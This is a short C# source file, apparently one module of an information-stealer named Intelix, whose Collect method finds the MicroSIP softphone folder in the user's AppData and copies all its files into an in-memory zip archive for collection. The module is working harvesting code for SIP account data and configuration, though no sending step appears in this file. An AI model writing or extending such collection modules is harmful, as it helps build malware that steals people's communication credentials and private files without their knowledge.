using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers;

public class MicroSIP : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MicroSIP");
		if (Directory.Exists(text))
		{
			string text2 = "MicroSIP\\";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "MicroSIP";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Messangers.Add(counterApplications);
		}
	}
}
